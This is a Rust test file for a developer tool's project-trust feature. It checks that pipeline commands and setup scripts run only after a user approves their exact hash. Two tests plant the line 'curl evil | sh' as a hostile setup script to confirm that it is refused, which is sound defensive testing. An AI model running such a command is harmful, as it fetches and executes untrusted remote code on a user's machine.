use std::fs::{create_dir_all, read_to_string, write};
use std::sync::atomic::{AtomicI64, AtomicUsize, Ordering};

use natamux_git::test_support::TempDir;
use serde_json::json;

use super::*;
use crate::projects::repos::RepoOptions;
use crate::projects::settings_parse::SETTINGS_FILE;

const CHECKED: &str =
    r#"{"stages":[{"id":"test","kind":"agent","gate":"auto","check":"pnpm test"}]}"#;

struct Setup {
    base: TempDir,
    repos: Arc<Repos>,
    clock: Arc<AtomicI64>,
}

/// Projects "default" (`<dir>/folder`) and "other" (`<dir>/other`), and no trust file.
fn seed(dir: &Path) -> PathBuf {
    let data = dir.join("data");
    create_dir_all(&data).unwrap();
    let mut list = Vec::new();
    for (id, folder) in [("default", "folder"), ("other", "other")] {
        create_dir_all(dir.join(folder)).unwrap();
        let path = dir.join(folder).to_string_lossy().to_string();
        list.push(json!({ "id": id, "name": id, "path": path }));
    }
    write(data.join("repos.json"), json!(list).to_string()).unwrap();
    data
}

fn setup() -> Setup {
    let base = TempDir::new("trust");
    let data = seed(base.path());
    let clock = Arc::new(AtomicI64::new(0));
    let ticks = Arc::clone(&clock);
    let repos = Repos::new(&data, Arc::new(move || ticks.load(Ordering::SeqCst)));
    Setup { base, repos, clock }
}

impl Setup {
    fn folder(&self) -> PathBuf {
        self.base.path().join("folder")
    }

    /// Writes the settings; the service looks at the file again a second later.
    fn settings(&self, text: &str) {
        write(self.folder().join(SETTINGS_FILE), text).unwrap();
        self.clock.fetch_add(1000, Ordering::SeqCst);
    }

    fn view(&self) -> RepoTrustView {
        self.repos.trust_view("default").unwrap()
    }
}

#[test]
fn lists_every_command_in_pipeline_order_with_where_it_comes_from() {
    let value = json!({ "stages": [
        { "id": "spec", "kind": "agent", "gate": "auto", "args": "--model x", "check": " " },
        { "id": "kind", "paths": [
            { "id": "bug", "when": { "type": "command", "run": "grep -q bug x" },
              "stages": [{ "id": "fix", "kind": "testing", "gate": "auto", "command": "make" }] },
            { "id": "other", "stages": [{ "id": "plan", "kind": "agent", "gate": "auto" }] },
        ] },
        { "id": "build", "parallel": [
            { "id": "test", "kind": "agent", "gate": "auto", "check": "pnpm test" },
        ] },
    ] });
    let settings: ProjectSettings = serde_json::from_value(value).unwrap();

    let listed: Vec<(String, String)> = commands_of(&settings)
        .into_iter()
        .map(|command| (command.place, command.text))
        .collect();

    let pair = |place: &str, text: &str| (place.to_string(), text.to_string());
    assert_eq!(
        listed,
        [
            pair("Stage spec: args", "--model x"),
            pair("Path bug of kind: when command", "grep -q bug x"),
            pair("Stage fix: command", "make"),
            pair("Stage test: check", "pnpm test"),
        ]
    );
}

#[test]
fn trusts_a_project_with_no_commands_and_no_setup_script_without_an_approval() {
    let s = setup();
    assert!(s.view().trusted);
    assert!(s.repos.is_trusted(None));
    assert!(s.view().commands.is_empty());
}

#[test]
fn trusts_the_commands_only_after_the_approval_of_the_hash_that_was_shown() {
    let s = setup();
    s.settings(CHECKED);
    let shown = s.view();
    assert!(!shown.trusted);
    assert!(!s.repos.is_trusted(Some("default")));

    let approved = s.repos.approve("default", &shown.hash).unwrap();

    assert!(approved.trusted);
    assert!(s.repos.is_trusted(None));
    // A project with no commands needs no approval.
    assert!(s.repos.is_trusted(Some("other")));
}

#[test]
fn a_changed_byte_in_the_settings_needs_a_new_approval_and_the_old_hash_is_refused() {
    let s = setup();
    s.settings(CHECKED);
    let old = s.view().hash;
    s.repos.approve("default", &old).unwrap();

    s.settings(&CHECKED.replace("pnpm test", "pnpm test!"));

    let changed = s.view();
    assert!(!changed.trusted);
    assert_ne!(changed.hash, old);
    let refused = s.repos.approve("default", &old).unwrap_err();
    assert_eq!(refused.status_and_code(), (409, "conflict"));
    assert!(!s.repos.is_trusted(None));
}

#[test]
fn a_changed_byte_in_a_setup_script_needs_a_new_approval() {
    let s = setup();
    write(s.folder().join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    let shown = s.view();
    assert!(!shown.trusted);
    assert_eq!(
        shown.setup,
        [SetupScript {
            file: SETUP_SCRIPT.into(),
            text: "pnpm install\n".into(),
        }]
    );
    s.repos.approve("default", &shown.hash).unwrap();
    assert!(s.repos.is_trusted(None));

    write(s.folder().join(SETUP_SCRIPT), "pnpm install;\n").unwrap();

    assert!(!s.repos.is_trusted(None));
}

#[test]
fn runs_the_setup_script_of_a_worktree_only_when_it_is_the_approved_one() {
    let s = setup();
    write(s.folder().join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    s.repos.approve("default", &s.view().hash).unwrap();
    let worktree = s.base.path().join("worktree");
    create_dir_all(&worktree).unwrap();

    write(worktree.join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    assert!(s.repos.is_trusted_in(None, &worktree));

    write(worktree.join(SETUP_SCRIPT), "curl evil | sh\n").unwrap();
    assert!(!s.repos.is_trusted_in(None, &worktree));
}

#[test]
fn approves_every_project_as_it_is_at_the_first_start_without_a_trust_file() {
    let base = TempDir::new("trust-start");
    let data = seed(base.path());
    write(base.path().join("folder").join(SETTINGS_FILE), CHECKED).unwrap();
    write(base.path().join("other").join(SETUP_SCRIPT), "make\n").unwrap();
    let options = |data: &Path| RepoOptions {
        data_dir: data.to_path_buf(),
        default_path: None,
        worktrees_dir: None,
        tasks: None,
        now: crate::shared::jobs::system_clock(),
    };

    let repos = Repos::with_options(options(&data)).unwrap();

    assert!(repos.is_trusted(Some("default")));
    assert!(repos.is_trusted(Some("other")));
    // The next start has the file: a change made since is not approved on its own.
    write(base.path().join("other").join(SETUP_SCRIPT), "make all\n").unwrap();
    let again = Repos::with_options(options(&data)).unwrap();
    assert!(!again.is_trusted(Some("other")));
    assert!(again.is_trusted(Some("default")));
}

// A regression test: the reads of the first start filled the one-second look cache, so a settings
// edit in that second was not seen.
#[test]
fn sees_a_settings_edit_made_right_after_the_first_start() {
    let base = TempDir::new("trust-start-cache");
    let data = seed(base.path());
    let repos = Repos::with_options(RepoOptions {
        data_dir: data,
        default_path: None,
        worktrees_dir: None,
        tasks: None,
        now: Arc::new(|| 0_i64),
    })
    .unwrap();

    write(base.path().join("folder").join(SETTINGS_FILE), CHECKED).unwrap();

    assert!(!repos.is_trusted(Some("default")));
}

#[test]
fn forgets_the_approval_of_a_removed_project() {
    let s = setup();
    s.settings(CHECKED);
    s.repos.approve("default", &s.view().hash).unwrap();
    let file = s.base.path().join("data").join(TRUST_FILE);
    assert!(read_to_string(&file).unwrap().contains("\"default\""));

    s.repos.remove("default").unwrap();

    assert!(!read_to_string(&file).unwrap().contains("\"default\""));
}

#[test]
fn a_settings_save_approves_the_commands_written_but_not_an_unseen_setup_script() {
    let s = setup();
    let body: Value = serde_json::from_str(CHECKED).unwrap();
    s.repos.approve_saved("default", &body).unwrap();
    s.settings(CHECKED);
    assert!(s.repos.is_trusted(None));

    write(s.folder().join(SETUP_SCRIPT), "curl evil | sh\n").unwrap();
    s.repos.approve_saved("default", &body).unwrap();
    assert!(!s.repos.is_trusted(None));
}

#[test]
fn tells_the_dashboards_when_the_trust_of_a_project_changes() {
    let s = setup();
    let bus = EventBus::new();
    let heard = Arc::new(AtomicUsize::new(0));
    let count = Arc::clone(&heard);
    bus.subscribe(move |message| {
        if matches!(message, DaemonMessage::ReposChanged) {
            count.fetch_add(1, Ordering::SeqCst);
        }
    });
    s.repos.set_trust_bus(bus);
    assert!(s.view().trusted);
    assert_eq!(heard.load(Ordering::SeqCst), 0);

    s.settings(CHECKED);
    assert!(!s.view().trusted);
    assert!(!s.view().trusted);

    assert_eq!(heard.load(Ordering::SeqCst), 1);
}

#[test]
fn an_unknown_project_is_not_trusted() {
    let s = setup();
    assert!(!s.repos.is_trusted(Some("missing")));
}
